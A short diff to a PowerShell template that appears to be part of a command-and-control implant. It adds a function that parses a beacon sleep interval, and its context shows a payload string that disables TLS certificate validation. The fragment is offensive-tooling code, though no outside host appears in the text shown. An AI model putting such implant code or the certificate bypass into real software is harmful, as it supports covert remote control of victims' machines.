@@ -1,5 +1,26 @@
 $key="%s"
-$global:sleeptime = '%s'
+Function Beacon($sleeptime) {
+    if ($sleeptime.ToLower().Contains('m')) { 
+        $sleeptime = $sleeptime -replace 'm', ''
+        [int]$newsleep = $sleeptime 
+        [int]$newsleep = $newsleep * 60
+    }
+    elseif ($sleeptime.ToLower().Contains('h')) { 
+        $sleeptime = $sleeptime -replace 'h', ''
+        [int]$newsleep1 = $sleeptime 
+        [int]$newsleep2 = $newsleep1 * 60
+        [int]$newsleep = $newsleep2 * 60
+    }
+    elseif ($sleeptime.ToLower().Contains('s')) { 
+        $newsleep = $sleeptime -replace 's', ''
+    } else {
+        $newsleep = $sleeptime
+    }
+    $script:sleeptime = $newsleep
+}
+
+$global:sleeptime = '5'
+Beacon('%s')
 
 $payloadclear = @"
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
